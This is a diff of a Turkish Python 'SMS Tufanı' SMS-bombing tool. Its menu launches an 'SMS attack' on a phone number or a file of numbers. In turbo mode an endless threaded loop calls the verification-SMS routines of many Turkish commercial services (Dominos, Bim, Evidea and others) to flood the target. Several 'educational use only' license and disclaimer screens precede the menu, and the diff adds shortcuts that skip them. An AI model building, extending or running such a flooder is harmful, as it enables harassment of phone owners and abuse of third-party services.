@@ -6,26 +6,23 @@ from os import system
 from sms import SendSms
 from concurrent.futures import ThreadPoolExecutor, wait
 
-
-def slow_print(text, delay=0.008, end='\n'):
+def slow_print(text, delay=0.001, end='\n'):
     for char in text:
         print(char, end='', flush=True)
         sleep(delay)
-    print(end, flush=True)  
+    print(end, flush=True)
 
 def slow_print_more(text, delay=0.03, end='\n'):
     for char in text:
         print(char, end='', flush=True)
         sleep(delay)
-    print(end, flush=True) 
-
+    print(end, flush=True)
 
 def slow_print_more_more(text, delay=0.06, end='\n'):
     for char in text:
         print(char, end='', flush=True)
         sleep(delay)
-    print(end, flush=True)  
-
+    print(end, flush=True)
 
 servisler_sms = []
 for attribute in dir(SendSms):
@@ -34,9 +31,41 @@ for attribute in dir(SendSms):
         if attribute.startswith('__') == False:
             servisler_sms.append(attribute)
 
-
+def check_skip_input():
+    if os.name == 'nt':
+        import msvcrt
+        if msvcrt.kbhit():
+            key = msvcrt.getch()
+            if key == b'\x05':  # Ctrl + E
+                return 'skip_animation'
+            elif key == b'\x12':  # Ctrl + R
+                return 'skip_legal'
+            elif key == b'\x0f':  # Ctrl + O
+                return 'skip_warning'
+    return None
 
 print(Fore.LIGHTBLUE_EX + """
+Ctrl + R tuşuna basarak şu anda ekrandaki yazıyı atlayabilirsiniz.
+© 2024 SMS Tufanı. Tüm Hakları Saklıdır.
+
+Bu yazılım "SMS Tufanı" adı altında geliştirilmiş olup, yalnızca eğitim ve siber güvenlik bilincini artırma amaçlı kullanılmak üzere tasarlanmıştır. Yazılımın ticari kullanım, kötüye kullanım veya herhangi bir yasadışı faaliyet için kullanılması yasaktır. Yazılımın kodu, tasarımı ve işleyişi üzerinde tüm haklar geliştiriciye aittir ve bu yazılımın herhangi bir kısmı, izin alınmaksızın kopyalanamaz, dağıtılamaz veya yeniden üretilemez.
+
+Yazılımın kullanımından doğabilecek yasal, teknik veya kişisel sorunlardan tamamen kullanıcı sorumludur ve geliştirici bu gibi durumlarda hiçbir sorumluluk kabul etmez. Yazılımın kullanımı sırasında ya da sonrasında meydana gelebilecek zararlardan geliştirici sorumlu tutulamaz.
+
+Bu yazılımı kullanarak, belirtilen koşulları kabul etmiş sayılırsınız.
+""")
+
+if check_skip_input() == 'skip_legal':
+    system("cls||clear")
+
+time.sleep(1)
+if os.name == 'nt':
+    os.system('cls')  
+else:
+    os.system('clear')  
+
+print(Fore.LIGHTBLUE_EX + """
+Ctrl + R tuşuna basarak şu anda ekrandaki yazıyı atlayabilirsiniz.
 LİSANS SÖZLEŞMESİ
 
 Bu yazılım, yalnızca eğitim ve öğretim amaçlı olarak geliştirilen "SMS Tufanı" adlı aracı içermektedir. Yazılımın ticari kullanımı, kötüye kullanımı veya herhangi bir yasa dışı faaliyet için kullanılması kesinlikle yasaktır. 
@@ -44,17 +73,41 @@ Bu yazılım, yalnızca eğitim ve öğretim amaçlı olarak geliştirilen "SMS 
 Kullanıcı, bu yazılımı kullanarak sorumluluklarını kabul eder ve yazılımın izin alınmaksızın değiştirilmesi, kopyalanması, çoğaltılması veya dağıtılması yasaktır. 
 
 Bu yazılımın kullanımı esnasında veya sonrasında ortaya çıkabilecek veri kaybı, sistem arızası, yasal sonuçlar ya da üçüncü şahıslara verilen zararlar gibi sorunlardan yazılım geliştiricisi hiçbir şekilde sorumlu tutulamaz.
-
-Bu lisans, yazılımın etik ve yasal sınırlar içinde kullanımını zorunlu kılmakta olup, yazılımı kullanmaya devam eden tüm kullanıcılar bu şartları kabul etmiş sayılır.
 """)
-time.sleep(2)
-if os.name == 'nt':
-    os.system('cls')  # Windows
-else:
-    os.system('clear')  # Unix 
 
+if check_skip_input() == 'skip_legal':
+    system("cls||clear")
+
+time.sleep(1)
+if os.name == 'nt':
+    os.system('cls')
+else:
+    os.system('clear')
 
 print(Fore.LIGHTBLUE_EX + """
+Ctrl + R tuşuna basarak şu anda ekrandaki yazıyı atlayabilirsiniz.
+MIT Lisansı
+
+İşbu belge ile, bu yazılımın bir kopyasına sahip olan herhangi bir kişiye, yazılımın sınırlama olmaksızın kullanımına, kopyalanmasına, değiştirilmesine, birleştirilmesine, yayımlanmasına, dağıtılmasına, alt lisans verilmesine ve/veya yazılımın kopyalarını satmasına, aşağıdaki koşullar altında izin verilmektedir:
+
+© 2024 SMS Tufanı. Tüm Hakları Saklıdır.
+
+Yukarıdaki telif hakkı bildirimi ve bu izin bildirimi, yazılımın tüm kopyalarına veya önemli bölümlerine dahil edilecektir.
+
+YAZILIM "OLDUĞU GİBİ", AÇIK YA DA ZIMNİ HERHANGİ BİR GARANTİ OLMAKSIZIN, PAZARLANABİLİRLİK, BELİRLİ BİR AMACA UYGUNLUK VEYA İHLAL DURUMUNA YÖNELİK GARANTİLER DAHİL, ANCAK BUNLARLA SINIRLI OLMAYAN GARANTİLER OLMADAN SAĞLANMAKTADIR. HİÇBİR DURUMDA YAZARLAR VEYA TELİF HAKKI SAHİPLERİ, YAZILIMDAN KAYNAKLANAN YA DA YAZILIMIN KULLANIMI VEYA DİĞER İŞLEMLERLE İLGİLİ HERHANGİ BİR TALEP, ZARAR VEYA DİĞER YÜKÜMLÜLÜKLERDEN SORUMLU TUTULAMAZ.
+""")
+
+if check_skip_input() == 'skip_legal':
+    system("cls||clear")
+
+time.sleep(1)
+if os.name == 'nt':
+    os.system('cls')
+else:
+    os.system('clear')
+
+print(Fore.LIGHTBLUE_EX + """
+Ctrl + R tuşuna basarak şu anda ekrandaki yazıyı atlayabilirsiniz.
 SON KULLANICI LİSANS SÖZLEŞMESİ (EULA)
 
 Bu yazılımı indirerek, kurarak veya kullanarak, bu Son Kullanıcı Lisans Sözleşmesi’nin (EULA) tüm koşullarını kabul etmiş sayılırsınız. Eğer bu koşulları kabul etmiyorsanız, yazılımı indirmeyin, kurmayın ve kullanmayın.
@@ -68,14 +121,18 @@ Yazılımı sadece yasal amaçlar doğrultusunda kullanabilirsiniz. Yazılımın
 3. GÜNCELLEMELER VE DESTEK
 Geliştirici, yazılımın herhangi bir güncellemesini veya desteğini sağlama yükümlülüğünde değildir. Güncellemeler sağlanırsa, bu EULA’nın şartlarına tabi olacaktır.
 """)
-time.sleep(2)
-if os.name == 'nt':
-    os.system('cls')  # Windows
-else:
-    os.system('clear')  # Unix
 
-    
+if check_skip_input() == 'skip_legal':
+    system("cls||clear")
+
+time.sleep(1)
+if os.name == 'nt':
+    os.system('cls')
+else:
+    os.system('clear')
+
 print(Fore.LIGHTBLUE_EX + """
+Ctrl + R tuşuna basarak şu anda ekrandaki yazıyı atlayabilirsiniz.
 4. SORUMLULUK REDDİ VE SINIRLAMALAR
 Yazılım "OLDUĞU GİBİ" sağlanmaktadır. Geliştirici, yazılımın hatasız çalışacağına, ihtiyaçlarınıza uygun olduğuna veya herhangi bir teknik sorun yaratmayacağına dair hiçbir garanti vermez. Yazılımın kullanımı sırasında veya sonrasında meydana gelebilecek herhangi bir veri kaybı, sistem arızası veya yasal sorundan geliştirici sorumlu tutulamaz.
 
@@ -87,61 +144,65 @@ Geliştirici, bu EULA’nın ihlal edilmesi durumunda yazılım kullanım hakkı
 
 Bu EULA, yazılımı kullanmaya başladığınız andan itibaren geçerli olup, yazılımın kullanımına yönelik tüm yasal sınırları belirler.
 """)
-time.sleep(2)
+
+if check_skip_input() == 'skip_legal':
+    system("cls||clear")
+
+time.sleep(1)
 if os.name == 'nt':
-    os.system('cls')  # Windows
+    os.system('cls')
 else:
-    os.system('clear')  # Unix 
-
-
-
-
-
-
+    os.system('clear')
 
 print(Fore.LIGHTBLUE_EX + """
+Ctrl + R tuşuna basarak şu anda ekrandaki yazıyı atlayabilirsiniz.
 FERAGATNAME (DISCLAIMER)
 
-Bu yazılım, yalnızca eğitim ve siber güvenlik bilincini artırma amaçlı geliştirilmiştir. Yazılımın yasa dışı, zarar verici veya herhangi bir kötü amaçla kullanılması kesinlikle yasaktır. Kullanıcılar, bu yazılımı kullanırken tüm yasal sorumluluğu üstlenir ve yazılımın kötüye kullanımı durumunda yasal sonuçlardan tamamen kullanıcı sorumludur.
+Bu yazılım, yalnızca eğitim ve siber güvenlik bilincini artırma amaçlı geliştirilmiştir. Yazılımın yasa dışı, zarar verici veya herhangi bir kötü amaçla kullanılması kesinlikle yasaktır. Kullanıcılar, bu yazılımı kullanırken tüm yasal sorumluluğu üstlenir ve yazılımın yanlış kullanımından doğacak sonuçlardan geliştirici sorumlu tutulamaz.
 
-Geliştirici, bu yazılımın yanlış veya kötü niyetli kullanımı nedeniyle oluşabilecek herhangi bir zarardan sorumlu tutulamaz. Yazılım "OLDUĞU GİBİ" sağlanmaktadır ve geliştirici, yazılımın herhangi bir hatasız çalışması, güvenliği veya herhangi bir amaca uygunluğu konusunda garanti vermez. Yazılımın kullanımından kaynaklanabilecek veri kaybı, sistem arızası veya diğer teknik sorunlar için geliştirici sorumluluk kabul etmez.
+Bu yazılım, yazılımcıların becerilerini geliştirmeleri ve siber güvenlik farkındalığı oluşturmaları amacıyla sunulmuştur. Ancak, yazılımın herhangi bir şekilde zarar verici amaçlarla kullanılması durumunda ortaya çıkabilecek yasal sonuçlardan kullanıcılar sorumludur.
 
-Bu yazılımı kullanarak, belirtilen tüm koşulları kabul etmiş sayılırsınız ve yazılımın kullanımından doğabilecek tüm riskleri ve sorumluluğu üstlenirsiniz.
-
+Bu yazılımı kullanarak, yukarıdaki feragatnameyi okuduğunuzu, anladığınızı ve kabul ettiğinizi onaylamış olursunuz.
 """)
-time.sleep(3)
-if os.name == 'nt':
-    os.system('cls')  # Windows
-else:
-    os.system('clear')  # Unix 
+
+time.sleep(1)
+system("cls||clear")
+
 
 print(Fore.LIGHTBLUE_EX + """
+Ctrl + R tuşuna basarak şu anda ekrandaki yazıyı atlayabilirsiniz.
 UYARI\n
 
 Bu yazılım yalnızca eğitim amaçlı olarak geliştirilmiştir ve kullanıcıların bu aracı kötüye kullanması veya herhangi bir kişi, kurum ya da kuruluşa zarar verme amacıyla kullanması kesinlikle yasaktır. Yazılımın amacı, siber güvenlik konusunda farkındalık oluşturmak ve eğitimsel amaçlara hizmet etmektir. Bu aracın kötüye kullanımı sonucu ortaya çıkabilecek herhangi bir hukuki, maddi, manevi veya teknik sorunun tamamıyla kullanıcının kendi sorumluluğunda olduğunu ve geliştirici olarak, bu yazılımın kullanımı sırasında veya sonrasında meydana gelebilecek herhangi bir veri kaybı, sistem arızası, hukuki yaptırım, kişisel zarar ya da üçüncü şahıslara verilebilecek her türlü zarardan sorumluluk kabul etmediğimi beyan ederim. Yazılımın amacı dışında kullanımı, yürürlükteki yasa ve yönetmeliklere aykırıdır ve kullanıcı, bu sorumlulukları ihlal etmesi durumunda her türlü hukuki ve cezai yaptırıma tabi olduğunu kabul eder.
-Bu kodda kullanılan markaları kodu inceleyerek görebilirsiniz. (Satır 206-246)
+Bu kodda kullanılan markaları kodu inceleyerek görebilirsiniz. (Satır 336-314)
 """)
-time.sleep(10)
+time.sleep(2)
 if os.name == 'nt':
-    os.system('cls')  # Windows
+    os.system('cls')  # Windows için
 else:
-    os.system('clear')  # Unix 
+    os.system('clear')  # Unix tabanlı sistemler için
+
 
 
 
 while 1:
     system("cls||clear")
     slow_print(f"""{Fore.LIGHTCYAN_EX}
-      ______   __       __   ______   ________  __    __  ________  ______   __    __  ______ 
-     /      \\ /  \\     /  | /      \\ /        |/  |  /  |/        |/      \\ /  \\  /  |/      |
-    /$$$$$$  |$$  \\   /$$ |/$$$$$$  |$$$$$$$$/ $$ |  $$ |$$$$$$$$//$$$$$$  |$$  \\ $$ |$$$$$$/ 
-    $$ \\__$$/ $$$  \\ /$$$ |$$ \\__$$/    $$ |   $$ |  $$ |$$ |__   $$ |__$$ |$$$  \\$$ |  $$ |  
-    $$      \\ $$$$  /$$$$ |$$      \\    $$ |   $$ |  $$ |$$    |  $$    $$ |$$$$  $$ |  $$ |  
-     $$$$$$  |$$ $$ $$/$$ | $$$$$$  |   $$ |   $$ |  $$ |$$$$$/   $$$$$$$$ |$$ $$ $$ |  $$ |  
-    /  \\__$$ |$$ |$$$/ $$ |/  \\__$$ |   $$ |   $$ \\__$$ |$$ |     $$ |  $$ |$$ |$$$$ | _$$ |_ 
-    $$    $$/ $$ | $/  $$ |$$    $$/    $$ |   $$    $$/ $$ |     $$ |  $$ |$$ | $$$ |/ $$   |
-     $$$$$$/  $$/      $$/  $$$$$$/     $$/     $$$$$$/  $$/      $$/   $$/ $$/   $$/ $$$$$$/ 
-                                                                                           {Style.RESET_ALL}{Fore.LIGHTRED_EX}tiktok.com/@unknown_napim\n
+                  ______   __       __   ______   ________  __    __  ________  ______   __    __  ______ 
+                 /      \\ /  \\     /  | /      \\ /        |/  |  /  |/        |/      \\ /  \\  /  |/      |
+                /$$$$$$  |$$  \\   /$$ |/$$$$$$  |$$$$$$$$/ $$ |  $$ |$$$$$$$$//$$$$$$  |$$  \\ $$ |$$$$$$/ 
+                $$ \\__$$/ $$$  \\ /$$$ |$$ \\__$$/    $$ |   $$ |  $$ |$$ |__   $$ |__$$ |$$$  \\$$ |  $$ |  
+                $$      \\ $$$$  /$$$$ |$$      \\    $$ |   $$ |  $$ |$$    |  $$    $$ |$$$$  $$ |  $$ |  
+                 $$$$$$  |$$ $$ $$/$$ | $$$$$$  |   $$ |   $$ |  $$ |$$$$$/   $$$$$$$$ |$$ $$ $$ |  $$ |  
+                /  \\__$$ |$$ |$$$/ $$ |/  \\__$$ |   $$ |   $$ \\__$$ |$$ |     $$ |  $$ |$$ |$$$$ | _$$ |_ 
+                $$    $$/ $$ | $/  $$ |$$    $$/    $$ |   $$    $$/ $$ |     $$ |  $$ |$$ | $$$ |/ $$   |
+                 $$$$$$/  $$/      $$/  $$$$$$/     $$/     $$$$$$/  $$/      $$/   $$/ $$/   $$/ $$$$$$/ 
+\n
+                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Tiktok: tiktok.com/@unknown_napim
+                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Youtube: youtube.com/@unknown_destroyer
+                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Youtube 2: youtube.com/@samhordesongs
+                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Discord: anonymous_destroyer01
+                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Github: github.com/Unknowndestroy
    """)
 
 
@@ -149,7 +210,7 @@ while 1:
 
 
     try:
-        menu = (input(Fore.LIGHTRED_EX + " 1- SMS Saldırısı Başlat (Normal, Yavaş)\n\n 2- SMS Saldırısı Başlat (Turbo, Aşırı Hızlı)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
+        menu = input(Fore.LIGHTRED_EX + "1- SMS Saldırısı Başlat (Normal, Yavaş)\n\n2- SMS Saldırısı Başlat (Turbo, Aşırı Hızlı)\n\n3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: ")
         if menu == "":
             continue
         menu = int(menu)
@@ -158,11 +219,28 @@ while 1:
         slow_print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
         sleep(3)
         continue
+
+    if menu == 3:
+        system("cls||clear")
+        slow_print(Fore.LIGHTYELLOW_EX + "Programdan çıkılıyor...\n")
+        break
+
     if menu == 1:
         system("cls||clear")
+        slow_print(Fore.LIGHTRED_EX + "\nDevam etmek istediğinizden emin misiniz? Bu başınıza büyük sıkıntılar açabilir.\n")
+        slow_print(Fore.LIGHTYELLOW_EX + "Evet (y) / Hayır (n): ", end="")
+        confirmation = input().lower()
+
+        if confirmation != 'y':
+            system("cls||clear")
+            slow_print(Fore.LIGHTRED_EX + "İşlem iptal edildi. Ana menüye dönülüyor...")
+            sleep(3)
+            continue
+
         slow_print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): ", end="")
         tel_no = input()
         tel_liste = []
+
         if tel_no == "":
             system("cls||clear")
             slow_print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: ", end="")
@@ -190,6 +268,7 @@ while 1:
                 slow_print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
                 sleep(3)
                 continue
+
         system("cls||clear")
         try:
             slow_print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): ", end="")
@@ -201,6 +280,7 @@ while 1:
             slow_print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
             sleep(3)
             continue
+
         system("cls||clear")
         try:
             slow_print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: ", end="")
@@ -214,6 +294,7 @@ while 1:
             slow_print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
             sleep(3)
             continue
+
         system("cls||clear")
         try:
             slow_print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: ", end="")
@@ -223,6 +304,7 @@ while 1:
             slow_print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
             sleep(3)
             continue
+
         system("cls||clear")
         if kere is None: 
             sms = SendSms(tel_no, mail)
@@ -281,25 +363,20 @@ while 1:
             while True:
                 with ThreadPoolExecutor() as executor:
                     futures = [
-                        executor.submit(send_sms.Akasya),
-                        executor.submit(send_sms.Akbati),
-                        executor.submit(send_sms.Ayyildiz),
                         executor.submit(send_sms.Baydoner),
                         executor.submit(send_sms.Beefull),
                         executor.submit(send_sms.Bim),
                         executor.submit(send_sms.Bisu),
                         executor.submit(send_sms.Bodrum),
-                        executor.submit(send_sms.Clickme),
                         executor.submit(send_sms.Dominos),
                         executor.submit(send_sms.Englishhome),
                         executor.submit(send_sms.Evidea),
                         executor.submit(send_sms.File),
                         executor.submit(send_sms.Frink),
-                        executor.submit(send_sms.Happy),
                         executor.submit(send_sms.Hayatsu),
                         executor.submit(send_sms.Hey),
-                        executor.submit(send_sms.Hizliecza),
                         executor.submit(send_sms.Icq),
+                        executor.submit(send_sms.Istegelsin),
                     ]
                     wait(futures)
                 sleep(5)  
@@ -311,3 +388,4 @@ while 1:
 
         print(Fore.LIGHTGREEN_EX + "\nBaşarılı. Menüyü görmek için 'enter' tuşuna basın.")
         input()
+
